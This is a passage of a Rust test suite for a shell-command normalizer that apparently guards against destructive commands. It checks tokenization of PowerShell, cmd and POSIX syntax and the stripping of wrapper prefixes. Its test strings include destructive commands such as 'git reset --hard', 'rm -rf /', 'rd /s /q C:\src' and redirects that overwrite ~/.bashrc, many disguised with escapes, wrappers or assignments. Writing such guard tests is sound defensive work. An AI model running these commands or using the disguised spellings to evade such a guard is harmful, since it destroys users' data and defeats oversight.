        }
        // These are not separators: the word stays whole.
        for joiner in ['\u{200b}', '\u{feff}', '\u{180e}', '\u{1c}'] {
            let command = format!("git{joiner}reset");
            assert_eq!(words(&command), [command.as_str()], "{joiner:?}");
        }
        // Quoted and backtick-escaped spaces stay inside their word.
        assert_eq!(
            words("echo \"a\u{a0}b\" 'c\u{3000}d' e`\u{a0}f"),
            ["echo", "\"a\u{a0}b\"", "'c\u{3000}d'", "e`\u{a0}f"]
        );
        // A comment after a Unicode space is a comment, so its quote opens
        // nothing.
        let masked = mask_powershell_comments("echo a\u{3000}# it's\ngit reset --hard")
            .expect("comment is masked");
        assert!(masked.ends_with("\ngit reset --hard"), "{masked:?}");
    }

    #[test]
    fn powershell_assignment_values_start_a_statement_wherever_a_target_starts() {
        let separated = |command: &str| powershell_assignment_views(command).separated;
        for (assignment, view) in [
            // Glued or spaced, every operator, every statement start.
            ("$c=iex 'x'", "$c;iex 'x'"),
            ("$c = iex 'x'", "$c ; iex 'x'"),
            ("$c \u{2013}= iex 'x'", "$c ;    iex 'x'"),
            (
                "$null = Remove-Item -Recurse x",
                "$null ; Remove-Item -Recurse x",
            ),
            ("$a, $b = git x", "$a, $b ; git x"),
            ("$c[ 0 ] = git x", "$c[ 0 ] ; git x"),
            ("@{a = git x}", "@{a ; git x}"),
            ("$c =iex 'x'", "$c ;iex 'x'"),
            ("$c= iex 'x'", "$c; iex 'x'"),
            ("$c+=iex 'x'", "$c; iex 'x'"),
            ("$c??=iex 'x'", "$c;  iex 'x'"),
            ("[int[]]$c=iex 'x'", "[int[]]$c;iex 'x'"),
            ("[string] $c=iex 'x'", "[string] $c;iex 'x'"),
            ("${c}=iex 'x'", "${c};iex 'x'"),
            ("$env:C=iex 'x'", "$env:C;iex 'x'"),
            ("$a=$b=iex 'x'", "$a=$b;iex 'x'"),
            ("$a = $b=iex 'x'", "$a = $b;iex 'x'"),
            ("$a, $b=iex 'x'", "$a, $b;iex 'x'"),
            ("$c.p[0]=iex 'x'", "$c.p[0];iex 'x'"),
            ("$h['k=v']=iex 'x'", "$h['k=v'];iex 'x'"),
            ("[T]::P=iex 'x'", "[T]::P;iex 'x'"),
            ("$c=@{a=iex 'x'}", "$c=@{a;iex 'x'}"),
            ("echo a;$c=iex 'x'", "echo a;$c;iex 'x'"),
            ("echo a\n$c=iex 'x'", "echo a\n$c;iex 'x'"),
            ("if(1){$c=iex 'x'}", "if(1){$c;iex 'x'}"),
            ("if(1){'a'}$c=iex 'x'", "if(1){'a'}$c;iex 'x'"),
            ("while($c=iex 'x'){}", "while($c;iex 'x'){}"),
            // Wherever the word stands: the readers judge the position.
            ("Get-Date & $c=iex 'x'", "Get-Date & $c;iex 'x'"),
            ("return $c=iex 'x'", "return $c;iex 'x'"),
            ("Write-Output $c=iex 'x'", "Write-Output $c;iex 'x'"),
            ("1|$c=iex 'x'", "1|$c;iex 'x'"),
            // Every target shape and operator spelling.
            ("$c\u{e9}=iex 'x'", "$c\u{e9};iex 'x'"),
            ("$\u{3a9}=iex 'x'", "$\u{3a9};iex 'x'"),
            ("$c.'p'=iex 'x'", "$c.'p';iex 'x'"),
            ("$c.\"p\"=iex 'x'", "$c.\"p\";iex 'x'"),
            ("$c.$n=iex 'x'", "$c.$n;iex 'x'"),
            ("$c.$('p')=iex 'x'", "$c.$('p');iex 'x'"),
            ("(Get-Item x).p=iex 'x'", "(Get-Item x).p;iex 'x'"),
            ("$c[(0)]=iex 'x'", "$c[(0)];iex 'x'"),
            ("$c.$('p') =iex 'x'", "$c.$('p') ;iex 'x'"),
            ("$c\u{2013}=iex 'x'", "$c;   iex 'x'"),
            ("$c\u{2014}=iex 'x'", "$c;   iex 'x'"),
            ("$c\u{2015}=iex 'x'", "$c;   iex 'x'"),
            // Brackets and braced names with blanks inside span words.
            ("$c[$i + 1]=iex 'x'", "$c[$i + 1];iex 'x'"),
            ("$c[ 0 ]=iex 'x'", "$c[ 0 ];iex 'x'"),
            ("$c[0 ]=iex 'x'", "$c[0 ];iex 'x'"),
            ("$c[ 'a' ]=iex 'x'", "$c[ 'a' ];iex 'x'"),
            ("$c[ 0 ] =iex 'x'", "$c[ 0 ] ;iex 'x'"),
            ("$c[ 0 ][ 1 ]=iex 'x'", "$c[ 0 ][ 1 ];iex 'x'"),
            ("$c[ 0 ].p=iex 'x'", "$c[ 0 ].p;iex 'x'"),
            ("$a[ 0 ]=$b=iex 'x'", "$a[ 0 ]=$b;iex 'x'"),
            ("$a[ 0 ],$b=iex 'x'", "$a[ 0 ],$b;iex 'x'"),
            ("[D[string, int]]$c=iex 'x'", "[D[string, int]]$c;iex 'x'"),
            ("[D[string, int]] $c=iex 'x'", "[D[string, int]] $c;iex 'x'"),
            ("${c d}=iex 'x'", "${c d};iex 'x'"),
            ("if(1){$c[ 0 ]=iex 'x'}", "if(1){$c[ 0 ];iex 'x'}"),
            // The words inside are still read: a target there is separated too.
            ("$c[ $($d=1) ]=iex 'x'", "$c[ $($d=1) ];iex 'x'"),
            (
                "Write-Output [a ; $c=iex 'x'",
                "Write-Output [a ; $c;iex 'x'",
            ),
            // Every hashtable key.
            ("@{a=1;b=iex 'x'}", "@{a=1;b;iex 'x'}"),
            ("@{a=1\nb=iex 'x'\n}", "@{a=1\nb;iex 'x'\n}"),
            ("@{ a=iex 'x'}", "@{ a;iex 'x'}"),
            ("@{a=@{x=1};'b'=iex 'x'}", "@{a=@{x=1};'b';iex 'x'}"),
            // A value in command mode: `&`, `.`, a path.
            ("$x = & $exe --version", "$x ; & $exe --version"),
            ("$c=.{x}", "$c;.{x}"),
            ("$c = ./x.ps1", "$c ; ./x.ps1"),
        ] {
            assert_eq!(
                separated(assignment).as_deref(),
                Some(view),
                "{assignment:?}"
            );
            assert_eq!(view.len(), assignment.len(), "{assignment:?}");
            // The view is a fixed point: it does not change again.
            assert_eq!(separated(view), None, "{view:?}");
        }
        for unchanged in [
            // A value in expression mode, and a script block's statements,
            // which are not keys.
            "$y=$x*2",
            "$el=$('#x')",
            "$c = (Get-Date)",
            "$n = 1",
            "$n = .5",
            "$s = 'git x'",
            "$t = [int]$s * 2",
            "$h = @{a = 1}",
            "$y = -not $x",
            "$c = ",
            "@{a={b=1;c=iex 'x'}}",
            "Write-Output '$c=iex x'",
            "Write-Output a$c=iex",
            "{a=1;b=iex 'x'}",
            "&{x}=iex",
            "Write-Output \"a;$c=iex\"",
            "$c -eq 'a=b'",
            "x=1 git status",
            "@'\n$c=iex 'x'\n'@",
            "git -c core.x=$y status",
            "$c[ 0 ] -eq 'a=b'",
            "Write-Output \"$c[ 0 ]=x\"",
            "Write-Output '[ a ]=b'",
            "[a ]=b",
            "${c d} -eq 'a=b'",
        ] {
            assert_eq!(separated(unchanged), None, "{unchanged:?}");
        }
    }

    #[test]
    fn powershell_expression_values_read_as_their_dollar_c_spelling() {
        let values = |command: &str| powershell_assignment_views(command).values;
        for (assignment, expected) in [
            // Glued or spaced, every target shape, to the statement's end.
            (
                "$c=[IO.Directory]::Delete('x', $true)",
                vec!["$c = [IO.Directory]::Delete('x', $true)"],
            ),
            (
                "$c=@(1,2); $c[ 0 ] = {git x}.Invoke(); Get-Date",
                vec!["$c = @(1,2)", "$c = {git x}.Invoke()"],
            ),
            ("$a, $b = {git x}.Invoke()", vec!["$c = {git x}.Invoke()"]),
            (
                "(Get-Variable c).Value = 1|%{git x}",
                vec!["$c = 1|%{git x}"],
            ),
            ("$c.'p q' = 'x' | iex", vec!["$c = 'x' | iex"]),
            // Hashtable entries end at `;`, a line end or the closing brace.
            (
                "@{a = 'git x'|iex; b = 1|%{git y}\nc = $x.y}",
                vec!["$c = 'git x'|iex", "$c = 1|%{git y}", "$c = $x.y"],
            ),
            // A value inside another reads as `$null` there: it is read by
            // itself.
            (
                "$h = @{a = {git x}.Invoke()}",
                vec!["$c = {git x}.Invoke()", "$c = @{a = $null}"],
            ),
            ("$a=$b=$d={git x}.Invoke()", vec!["$c = {git x}.Invoke()"]),
            (
                "$c = {git x; $d = $e.f}.Invoke()",
                vec!["$c = $e.f", "$c = {git x; $d = $null}.Invoke()"],
            ),
            (
                "$c = @{a = git x; b = 1}",
                vec!["$c = @{a = $null; b = $null}"],
            ),
            // Brackets, strings and here-strings hold their `;`, `}` and
            // line ends.
            (
                "$c = 1 | % { a; b\n c }; d",
                vec!["$c = 1 | % { a; b\n c }"],
            ),
            (
                "$c = 'a;}' + \"b)\" | iex; d",
                vec!["$c = 'a;}' + \"b)\" | iex"],
            ),
            ("$c = @'\n;}\n'@ | iex\nd", vec!["$c = @'\n;}\n'@ | iex"]),
            ("$c = (1) + $x.y; d", vec!["$c = (1) + $x.y"]),
            // A pipeline continues across a line end next to `|`.
            ("$c = 'x' |\n iex\nd", vec!["$c = 'x' |\n iex"]),
            ("$c = 'x'\n\n | iex\nd", vec!["$c = 'x'\n\n | iex"]),
            ("$c = 'x' `\n| iex\nd", vec!["$c = 'x' `\n| iex"]),
            ("if (1) { $c = $x.y } else {}", vec!["$c = $x.y"]),
            // The same value is read once.
            ("$a = $x.y; $b = $x.y", vec!["$c = $x.y"]),
            // A value that can run nothing is not read.
            (
                "$y=$x*2; $s = 'git x'; $n = -1.5; $t = \"a $x\"; $h[$i] = !$b",
                vec![],
            ),
            ("$t = \"a $(git x)\"", vec!["$c = \"a $(git x)\""]),
            ("$t = 1kb", vec!["$c = 1kb"]),
            // A script block is not run by its assignment.
            (
                "$c = {git x}; $h = @{a = { git y }}",
                vec!["$c = @{a = $null}"],
            ),
            ("$c = {git x}.Invoke()", vec!["$c = {git x}.Invoke()"]),
            ("$c = {git x} | % { $_ }", vec!["$c = {git x} | % { $_ }"]),
            // A value in command mode is separated, not copied.
            ("$c = git x", vec![]),
            ("$c = ", vec![]),
            // A value whose brackets never close is not read.
            ("cat <<'EOF'\n$h={\nEOF", vec![]),
            ("$c = (1; $d = $x.y", vec!["$c = $x.y"]),
        ] {
            assert_eq!(values(assignment), expected, "{assignment:?}");
        }
    }

    #[test]
    fn powershell_here_strings_are_single_tokens_and_resume_after_terminator() {
        let single_here_string =
            "@'\u{00a0}\t\r\nIt's literal \u{2603}; Clear-Content hidden.txt\r\n'@";
        let single_command =
            format!("Write-Output {single_here_string}; Clear-Content visible.txt");
        assert_eq!(
            raw_token_snapshot(&single_command, ShellDialect::PowerShell),
            vec![
                (NormalizeTokenKind::Word, "Write-Output".to_string()),
                (NormalizeTokenKind::Word, single_here_string.to_string()),
                (NormalizeTokenKind::Separator, ";".to_string()),
                (NormalizeTokenKind::Word, "Clear-Content".to_string()),
                (NormalizeTokenKind::Word, "visible.txt".to_string()),
            ]
        );
        assert_eq!(
            crate::packs::split_command_segments_in_dialect(
                &single_command,
                ShellDialect::PowerShell,
            ),
            vec![
                format!("Write-Output {single_here_string}"),
                "Clear-Content visible.txt".to_string(),
            ]
        );

        let double_here_string = "@\"\nA \"quoted\" body; git branch --delete hidden\n\"@";
        let double_command = format!("Write-Output {double_here_string}; git branch -D visible");
        assert_eq!(
            raw_token_snapshot(&double_command, ShellDialect::PowerShell),
            vec![
                (NormalizeTokenKind::Word, "Write-Output".to_string()),
                (NormalizeTokenKind::Word, double_here_string.to_string()),
                (NormalizeTokenKind::Separator, ";".to_string()),
                (NormalizeTokenKind::Word, "git".to_string()),
                (NormalizeTokenKind::Word, "branch".to_string()),
                (NormalizeTokenKind::Word, "-D".to_string()),
                (NormalizeTokenKind::Word, "visible".to_string()),
            ]
        );
        assert_eq!(
            crate::packs::split_command_segments_in_dialect(
                &double_command,
                ShellDialect::PowerShell,
            ),
            vec![
                format!("Write-Output {double_here_string}"),
                "git branch -D visible".to_string(),
            ]
        );

        let assigned_here_string = "@'\nvalue's apostrophe\n'@";
        let assignment = format!("$value={assigned_here_string}; Clear-Content visible.txt");
        assert_eq!(
            raw_token_snapshot(&assignment, ShellDialect::PowerShell),
            vec![
                (
                    NormalizeTokenKind::Word,
                    format!("$value={assigned_here_string}"),
                ),
                (NormalizeTokenKind::Separator, ";".to_string()),
                (NormalizeTokenKind::Word, "Clear-Content".to_string()),
                (NormalizeTokenKind::Word, "visible.txt".to_string()),
            ]
        );
    }

    #[test]
    fn powershell_malformed_here_strings_remain_opaque() {
        let unterminated =
            "Write-Output @'\nit's still body\n  '@; Clear-Content must-not-split.txt";
        assert_eq!(
            raw_token_snapshot(unterminated, ShellDialect::PowerShell),
            vec![
                (NormalizeTokenKind::Word, "Write-Output".to_string()),
                (
                    NormalizeTokenKind::Word,
                    "@'\nit's still body\n  '@; Clear-Content must-not-split.txt".to_string(),
                ),
            ]
        );
        assert_eq!(
            crate::packs::split_command_segments_in_dialect(unterminated, ShellDialect::PowerShell,),
            vec![unterminated]
        );
    }

    #[test]
    fn powershell_here_string_detection_does_not_capture_other_at_forms() {
        for command in [
            "Write-Output @args; Clear-Content visible.txt",
            "Write-Output @(1, 2); git branch -D visible",
            "Write-Output @'same-line string'; Clear-Content visible.txt",
        ] {
            assert!(
                raw_token_snapshot(command, ShellDialect::PowerShell)
                    .iter()
                    .any(|(kind, text)| *kind == NormalizeTokenKind::Separator && text == ";"),
                "non-here-string @ form hid its following separator: {command:?}"
            );
        }
    }

    #[test]
    fn powershell_raw_tokenizer_honors_stop_parsing_until_newline() {
        let command = "git branch -`-% --delete \"feature name\" ; echo\r\nGet-Date; echo";
        assert_eq!(
            raw_token_snapshot(command, ShellDialect::PowerShell),
            vec![
                (NormalizeTokenKind::Word, "git".to_string()),
                (NormalizeTokenKind::Word, "branch".to_string()),
                (NormalizeTokenKind::Word, "-`-%".to_string()),
                (NormalizeTokenKind::Word, "--delete".to_string()),
                (NormalizeTokenKind::Word, "\"feature name\"".to_string()),
                (NormalizeTokenKind::Word, ";".to_string()),
                (NormalizeTokenKind::Word, "echo".to_string()),
                (NormalizeTokenKind::Separator, "\r\n".to_string()),
                (NormalizeTokenKind::Word, "Get-Date".to_string()),
                (NormalizeTokenKind::Separator, ";".to_string()),
                (NormalizeTokenKind::Word, "echo".to_string()),
            ]
        );
    }

    #[test]
    fn powershell_stop_parsing_treats_semicolon_as_literal_and_pipe_as_boundary() {
        for pipeline in ["|", "|&", "||"] {
            let command = format!(
                "git branch --% --delete \"feature;name|quoted\" ; literal {pipeline} echo ok"
            );
            assert_eq!(
                raw_token_snapshot(&command, ShellDialect::PowerShell),
                vec![
                    (NormalizeTokenKind::Word, "git".to_string()),
                    (NormalizeTokenKind::Word, "branch".to_string()),
                    (NormalizeTokenKind::Word, "--%".to_string()),
                    (NormalizeTokenKind::Word, "--delete".to_string()),
                    (
                        NormalizeTokenKind::Word,
                        "\"feature;name|quoted\"".to_string()
                    ),
                    (NormalizeTokenKind::Word, ";".to_string()),
                    (NormalizeTokenKind::Word, "literal".to_string()),
                    (NormalizeTokenKind::Separator, pipeline.to_string()),
                    (NormalizeTokenKind::Word, "echo".to_string()),
                    (NormalizeTokenKind::Word, "ok".to_string()),
                ],
                "pipeline boundary {pipeline:?}"
            );
        }
    }

    #[test]
    fn cmd_raw_tokenizer_keeps_caret_escaped_bytes_inside_words() {
        let command = "g^it branch -^d feature^ name foo^&bar & echo ^|literal g^\r\nit";
        assert_eq!(
            raw_token_snapshot(command, ShellDialect::Cmd),
            vec![
                (NormalizeTokenKind::Word, "g^it".to_string()),
                (NormalizeTokenKind::Word, "branch".to_string()),
                (NormalizeTokenKind::Word, "-^d".to_string()),
                (NormalizeTokenKind::Word, "feature^ name".to_string()),
                (NormalizeTokenKind::Word, "foo^&bar".to_string()),
                (NormalizeTokenKind::Separator, "&".to_string()),
                (NormalizeTokenKind::Word, "echo".to_string()),
                (NormalizeTokenKind::Word, "^|literal".to_string()),
                (NormalizeTokenKind::Word, "g^\r\nit".to_string()),
            ]
        );

        let boundary_continuation = "& ^\r\n rd /s /q C:\\src";
        assert_eq!(
            raw_token_snapshot(boundary_continuation, ShellDialect::Cmd),
            vec![
                (NormalizeTokenKind::Separator, "&".to_string()),
                (NormalizeTokenKind::Word, "rd".to_string()),
                (NormalizeTokenKind::Word, "/s".to_string()),
                (NormalizeTokenKind::Word, "/q".to_string()),
                (NormalizeTokenKind::Word, "C:\\src".to_string()),
            ]
        );
    }

    #[test]
    fn powershell_decoder_handles_bare_double_and_single_quoted_syntax() {
        let mut decoder = ShellTokenDecoder::new(ShellDialect::PowerShell);
        let cases = [
            ("git", "git"),
            (r#""git""#, "git"),
            ("'git'", "git"),
            ("g`it", "git"),
            (r#""g`it""#, "git"),
            ("'g`it'", "g`it"),
            ("--delete", "--delete"),
            (r#""--delete""#, "--delete"),
            ("'--delete'", "--delete"),
            ("--d`elete", "--delete"),
            (r#""--d`elete""#, "--delete"),
            ("'--d`elete'", "--d`elete"),
        ];

        for (raw, expected) in cases {
            assert_eq!(
                decoder.decode(raw, ShellTokenRole::Syntax).as_deref(),
                Some(expected),
                "PowerShell syntax token {raw:?}"
            );
        }
    }

    #[test]
    fn powershell_decoder_honors_continuations_and_stop_parsing() {
        let mut decoder = ShellTokenDecoder::new(ShellDialect::PowerShell);
        assert_eq!(
            decoder
                .decode("g`\r\nit", ShellTokenRole::Syntax)
                .as_deref(),
            Some("git")
        );
        assert_eq!(
            decoder
                .decode("--de`\nlete", ShellTokenRole::Syntax)
                .as_deref(),
            Some("--delete")
        );
        assert_eq!(
            decoder
                .decode("'--de`\r\nlete'", ShellTokenRole::Syntax)
                .as_deref(),
            Some("--de`\r\nlete")
        );

        assert_eq!(decoder.decode("--%", ShellTokenRole::Syntax), None);
        assert_eq!(
            decoder
                .decode("--delete", ShellTokenRole::Syntax)
                .as_deref(),
            Some("--delete"),
            "exact options after --% must remain visible to Git"
        );
        assert_eq!(
            decoder
                .decode("--d`elete", ShellTokenRole::Syntax)
                .as_deref(),
            Some("--d`elete"),
            "tokens after --% must remain literal"
        );

        // pwsh 7.5: `--%` with backticks or a quoted part after its first
        // character stops parsing (`$x = 'a'; git --'%' $x` hands git `$x`).
        for marker in ["-`-%", "--`%", "--'%'", "-\"-%\""] {
            let mut marker_decoder = ShellTokenDecoder::new(ShellDialect::PowerShell);
            assert_eq!(marker_decoder.decode(marker, ShellTokenRole::Syntax), None);
            assert_eq!(
                marker_decoder
                    .decode("g`it", ShellTokenRole::Syntax)
                    .as_deref(),
                Some("g`it"),
                "{marker} stops parsing"
            );
        }
        // A word that starts with a quote is dropped from a native argv but
        // does not stop parsing: `$x = 'a'; git '--%' $x` hands git `a`, and
        // `Write-Output '--%'; git status` runs git (pwsh 7.5).
        for quoted_marker in [r#""--%""#, "'--%'", "\u{2018}--%\u{2019}"] {
            let mut quoted_decoder = ShellTokenDecoder::new(ShellDialect::PowerShell);
            let decoded = quoted_decoder.decode(quoted_marker, ShellTokenRole::Syntax);
            if quoted_marker.starts_with('\u{2018}') {
                assert_eq!(decoded.as_deref(), Some(quoted_marker));
            } else {
                assert_eq!(decoded, None, "{quoted_marker} is dropped");
            }
            assert_eq!(
                quoted_decoder
                    .decode("g`it", ShellTokenRole::Syntax)
                    .as_deref(),
                Some("git"),
                "{quoted_marker} does not stop parsing"
            );
        }
    }

    #[test]
    fn powershell_tokenizer_does_not_stop_parsing_at_a_quoted_marker() {
        // `Write-Output '--%'; git reset --hard` runs git (pwsh 7.5).
        for command in [
            "Write-Output '--%'; git reset --hard",
            "Write-Output \"--%\"; git reset --hard",
        ] {
            let separators: Vec<String> = raw_token_snapshot(command, ShellDialect::PowerShell)
                .into_iter()
                .filter(|(kind, _)| *kind == NormalizeTokenKind::Separator)
                .map(|(_, text)| text)
                .collect();
            assert_eq!(separators, vec![";".to_string()], "{command}");
        }
    }

    #[test]
    fn cmd_decoder_removes_one_unquoted_caret_layer() {
        let mut decoder = ShellTokenDecoder::new(ShellDialect::Cmd);
        let cases = [
            ("git", "git"),
            (r#""git""#, "git"),
            ("'git'", "'git'"),
            ("g^it", "git"),
            (r#""g^it""#, "g^it"),
            ("'g^it'", "'git'"),
            ("--delete", "--delete"),
            (r#""--delete""#, "--delete"),
            ("'--delete'", "'--delete'"),
            ("--d^elete", "--delete"),
            (r#""--d^elete""#, "--d^elete"),
            ("'--d^elete'", "'--delete'"),
            ("g^^it", "g^it"),
        ];

        for (raw, expected) in cases {
            assert_eq!(
                decoder.decode(raw, ShellTokenRole::Syntax).as_deref(),
                Some(expected),
                "Cmd syntax token {raw:?}"
            );
        }
    }

    #[test]
    fn shell_decoder_never_changes_data_tokens_or_arms_stop_parsing() {
        let data_tokens = [
            "g`it",
            r#""--d`elete""#,
            "'--d`elete'",
            "g^it",
            r#""--d^elete""#,
            "'--d^elete'",
            "--%",
        ];

        for dialect in [
            ShellDialect::Posix,
            ShellDialect::PowerShell,
            ShellDialect::Cmd,
            ShellDialect::Unknown,
        ] {
            let mut decoder = ShellTokenDecoder::new(dialect);
            for token in data_tokens {
                assert_eq!(
                    decoder.decode(token, ShellTokenRole::Data).as_deref(),
                    Some(token),
                    "{dialect:?} data token must be byte-preserving"
                );
            }
            if dialect == ShellDialect::PowerShell {
                assert_eq!(
                    decoder.decode("g`it", ShellTokenRole::Syntax).as_deref(),
                    Some("git"),
                    "a data-role --% must not arm literal mode"
                );
            }
        }
    }

    #[test]
    fn test_not_sudo_prefix() {
        let result = strip_wrapper_prefixes("sudoku play");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_env_simple() {
        let result = strip_wrapper_prefixes("env git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_env_with_assignment() {
        let result = strip_wrapper_prefixes("env GIT_DIR=.git git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_env_with_quoted_assignment() {
        let result = strip_wrapper_prefixes("env FOO=\"a b\" git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_env_assignment_with_backticks_preserved() {
        let result = strip_wrapper_prefixes("env FOO=`rm -rf /` git status");
        assert!(
            result.normalized.contains("rm -rf /"),
            "assignment with inline code should remain visible"
        );
    }

    #[test]
    fn test_env_assignment_with_single_quoted_backticks_skipped() {
        let result = strip_wrapper_prefixes("env FOO='`rm -rf /`' git status");
        assert_eq!(result.normalized, "git status");
    }

    #[test]
    fn test_env_alone() {
        let result = strip_wrapper_prefixes("env");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_command_wrapper() {
        let result = strip_wrapper_prefixes("command git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_command_wrapper_with_path() {
        let result = strip_wrapper_prefixes("/usr/bin/command git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_command_v_not_wrapper() {
        let result = strip_wrapper_prefixes("command -v git");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_command_v_with_path_not_wrapper() {
        let result = strip_wrapper_prefixes("/usr/bin/command -v git");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_command_pv_not_wrapper() {
        let result = strip_wrapper_prefixes("command -pv git");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_command_p_wrapper() {
        let result = strip_wrapper_prefixes("command -p git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn test_command_unknown_flag_does_not_strip() {
        let result = strip_wrapper_prefixes("command -x git reset --hard");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_command_unknown_long_flag_does_not_strip() {
        let result = strip_wrapper_prefixes("command --foo git reset --hard");
        assert!(!result.was_normalized());
    }

    #[test]
    fn test_backslash_git() {
        let result = strip_wrapper_prefixes("\\git reset --hard");
        assert_eq!(result.normalized, "git reset --hard");
    }

    #[test]
    fn execution_wrappers_strip_only_unambiguous_command_forms() {
        let cases = [
            ("exec git reset --hard", "git reset --hard"),
            ("exec -cl -a dcg git reset --hard", "git reset --hard"),
            ("nohup -- git reset --hard", "git reset --hard"),
            ("nohup git reset --hard", "git reset --hard"),
            ("time -p git reset --hard", "git reset --hard"),
            ("/usr/bin/time -v git reset --hard", "git reset --hard"),
            (
                "time --format=%E --output timing.txt git reset --hard",
                "git reset --hard",
            ),
            (
                "sudo env DCG=1 command exec nohup time git reset --hard",
                "git reset --hard",
            ),
        ];
        for (command, expected) in cases {
            assert_eq!(
                strip_wrapper_prefixes(command).normalized,
                expected,
                "{command}"
            );
        }

        for command in [
            "exec -x git reset --hard",
            "nohup --help git reset --hard",
            "time --help git reset --hard",
            "time --unknown git reset --hard",
        ] {
            assert!(
                !strip_wrapper_prefixes(command).was_normalized(),
                "{command}"
            );
        }
    }

    #[test]
    fn time_reads_attached_option_values_only_from_options() {
        // `-fFORMAT` and `-oFILE` carry their value. A wrapped program whose
        // second byte is `f` or `o` is still the program: it used to be skipped
        // as an option, so the word after it became the command. Synthetic
        // program names.
        let cases = [
            ("time zofftool shatter", "zofftool shatter"),
            ("time -p zofftool shatter", "zofftool shatter"),
            ("time /opt/bin/frobtool zap", "/opt/bin/frobtool zap"),
            ("time /fs/frobtool zap", "/fs/frobtool zap"),
            ("time -o t.txt zofftool shatter", "zofftool shatter"),
            ("time -ot.txt zofftool shatter", "zofftool shatter"),
            ("time -f%E zofftool shatter", "zofftool shatter"),
            ("time --output=t.txt zofftool shatter", "zofftool shatter"),
        ];
        for (command, expected) in cases {
            assert_eq!(
                strip_wrapper_prefixes(command).normalized,
                expected,
                "{command}"
            );
        }
    }

    #[test]
    fn timeout_and_chrt_never_take_an_option_word_as_the_duration_or_program() {
        // `timeout` clusters its flags getopt style, and the last letter of a
        // cluster may be `-k`/`-s`, whose value is the rest of the word or the
        // next word. Read as the DURATION, such a cluster made the real
        // duration the program. Synthetic program names.
        let stripped = [
            ("timeout -vk 5 10 zofftool shatter", "zofftool shatter"),
            ("timeout -vk5 10 zofftool shatter", "zofftool shatter"),
            ("timeout -fs KILL 10 zofftool shatter", "zofftool shatter"),
            ("timeout -pvsKILL 10 zofftool shatter", "zofftool shatter"),
            ("timeout -k 5 -v 10 zofftool shatter", "zofftool shatter"),
            ("timeout -- 10 zofftool shatter", "zofftool shatter"),
        ];
        for (command, expected) in stripped {
            assert_eq!(
                strip_wrapper_prefixes(command).normalized,
                expected,
                "{command}"
            );
        }
        // An option the parser does not model (a long-option abbreviation, an
        // unknown letter) is never the duration, and a word the priority slot
        // of `chrt` does not hold is never the program: the wrapper stays.
        for command in [
            "timeout --sig KILL 10 zofftool shatter",
            "timeout -x 10 zofftool shatter",
            "timeout -vx 10 zofftool shatter",
            "chrt -o --fi 0 zofftool shatter",
            "chrt --other -x zofftool shatter",
        ] {
            assert!(
                !strip_wrapper_prefixes(command).was_normalized(),
                "an option word was read as the duration or program: {command} -> {}",
                strip_wrapper_prefixes(command).normalized
            );
        }
    }

    #[test]
    fn wrapper_option_values_never_consume_redirections_issue_531() {
        let wrappers: &[(&str, &[&str])] = &[
            (
                "sudo",
                &[
                    "-u", "-g", "-h", "-p", "-C", "-r", "-U", "-D", "-t", "-a", "-T",
                ],
            ),
            (
                "env",
                &[
                    "-u",
                    "-P",
                    "-C",
                    "-f",
                    "-a",
                    "-S",
                    "--unset",
                    "--chdir",
                    "--file",
                    "--argv0",
                    "--ignore-signal",
                    "--split-string",
                ],
            ),
            ("exec", &["-a"]),
            ("time", &["-f", "--format", "-o", "--output"]),
            ("nice", &["-n", "--adjustment"]),
            ("ionice", &["-c", "--class", "-n", "--classdata"]),
            ("timeout", &["-k", "--kill-after", "-s", "--signal"]),
            (
                "stdbuf",
                &["-i", "--input", "-o", "--output", "-e", "--error"],
            ),
            (
                "chrt",
                &[
                    "-T",
                    "--sched-runtime",
                    "-P",
                    "--sched-period",
                    "-D",
                    "--sched-deadline",
                ],
            ),
            (
                "mise exec",
                &[
                    "-C",
                    "--cd",
                    "-E",
                    "--env",
                    "-j",
                    "--jobs",
                    "-P",
                    "--profile",
                    "--allow-net",
                ],
            ),
        ];
        for (wrapper, options) in wrappers {
            for option in *options {
                for redirect in [">", ">>", "2>", "&>", ">|", "<>"] {
                    let command =
                        format!("{wrapper} {option} {redirect} ~/.bashrc value 5 echo hi");
                    let normalized = strip_wrapper_prefixes(&command);
                    assert_eq!(normalized.normalized, command, "{command}");
                    assert!(
                        !normalized.was_normalized(),
                        "a shell redirect is never a wrapper's option value: {command}"
                    );
                }
            }
        }
    }

    #[test]
    fn attached_redirections_stay_in_wrapper_source_issue_531() {
        for command in [
            "nice -n 5>~/.bashrc echo hi",
            "nice -n5>~/.bashrc echo hi",
            "nice --adjustment=5>~/.bashrc echo hi",
            "sudo -u root>~/.bashrc echo hi",
            "sudo -uroot>~/.bashrc echo hi",
            "sudo -p'password '>~/.bashrc echo hi",
            "env -u FOO>~/.bashrc echo hi",
            "env -uFOO>~/.bashrc echo hi",
            "env --unset=FOO>~/.bashrc echo hi",
            "env --unset='FOO '>~/.bashrc echo hi",
            "exec -a name>>~/.bashrc echo hi",
            "time --format=%e>~/.bashrc echo hi",
            "timeout 5>~/.bashrc echo hi",
            "stdbuf -oL&>~/.bashrc echo hi",
            "chrt -r 5>~/.bashrc echo hi",
            "mise exec --cd=/tmp>~/.bashrc -- echo hi",
            "FOO=value>~/.bashrc echo hi",
        ] {
            let normalized = strip_wrapper_prefixes(command);
            assert_eq!(normalized.normalized, command, "{command}");
            assert!(!normalized.was_normalized(), "{command}");
        }

        // An outer wrapper may still be removed, but no layer may discard
        // the shell action from the remaining command.
        for command in [
            "sudo nice -n > ~/.bashrc 5 echo hi",
            "env nice -n > ~/.bashrc 5 echo hi",
            "X=1 nice -n > ~/.bashrc 5 echo hi",
            "env FOO=value>~/.bashrc echo hi",
        ] {
            assert!(
                strip_wrapper_prefixes(command).normalized.contains('>'),
                "nested normalization erased the redirect: {command}"
            );
        }
    }

    #[test]
